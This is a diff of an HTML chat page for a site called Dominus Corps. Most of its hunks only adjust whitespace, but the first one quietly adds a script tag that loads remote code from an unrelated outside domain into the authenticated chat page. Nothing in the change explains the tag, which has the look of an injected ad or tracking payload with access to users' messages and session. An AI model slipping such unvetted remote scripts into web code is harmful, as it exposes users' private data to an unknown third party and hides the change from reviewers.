@@ -1,7 +1,8 @@
-
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
+    <script src="https://quge5.com/88/tag.min.js" data-zone="200779" async data-cfasync="false"></script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Chat - Dominus Corps</title>
@@ -215,6 +216,7 @@
         }
     </style>
 </head>
+
 <body>
     <nav>
         <a href="/dashboard" class="nav-brand">
@@ -271,7 +273,7 @@
             try {
                 // Try regular user endpoint first
                 let response = await fetch('/api/user', { credentials: 'include' });
-                
+
                 if (response.ok) {
                     const user = await response.json();
                     currentUser = user.username;
@@ -299,7 +301,7 @@
                     // Admin sees all clients
                     const response = await fetch('/api/chat/clients', { credentials: 'include' });
                     const data = await response.json();
-                    
+
                     if (data.success) {
                         displayUserList(data.clients, 'Clients');
                     }
@@ -315,7 +317,7 @@
         function displayUserList(users, title) {
             document.getElementById('sidebarTitle').textContent = title;
             const userList = document.getElementById('userList');
-            
+
             if (users.length === 0) {
                 userList.innerHTML = '<div class="empty-state">No users available</div>';
                 return;
@@ -339,7 +341,7 @@
             selectedReceiver = username;
             document.getElementById('chatTitle').textContent = `Chat with ${username}`;
             document.getElementById('inputArea').style.display = 'flex';
-            
+
             // Mark as active
             document.querySelectorAll('.user-item').forEach(item => {
                 item.classList.remove('active');
@@ -348,12 +350,12 @@
 
             // Load chat history
             await loadChatHistory(username);
-            
+
             // Mark messages as read
             const messageIds = Array.from(document.querySelectorAll('.message.received'))
                 .map(msg => msg.dataset.messageId)
                 .filter(id => id);
-            
+
             if (messageIds.length > 0) {
                 socket.emit('mark-read', { messageIds });
                 const badge = document.getElementById(`badge-${username}`);
@@ -367,7 +369,7 @@
                     credentials: 'include'
                 });
                 const data = await response.json();
-                
+
                 if (data.success) {
                     displayMessages(data.messages);
                 }
@@ -387,14 +389,14 @@
                     </div>
                 `;
             }).join('');
-            
+
             container.scrollTop = container.scrollHeight;
         }
 
         function sendMessage() {
             const input = document.getElementById('messageInput');
             const message = input.value.trim();
-            
+
             if (!message || !selectedReceiver) return;
 
             socket.emit('send-message', {
@@ -451,7 +453,7 @@
                 const indicator = document.getElementById('typingIndicator');
                 indicator.textContent = `${data.username} is typing...`;
                 indicator.style.display = 'block';
-                
+
                 clearTimeout(typingTimeout);
                 typingTimeout = setTimeout(() => {
                     indicator.style.display = 'none';
@@ -492,4 +494,5 @@
         }
     </script>
 </body>
+
 </html>
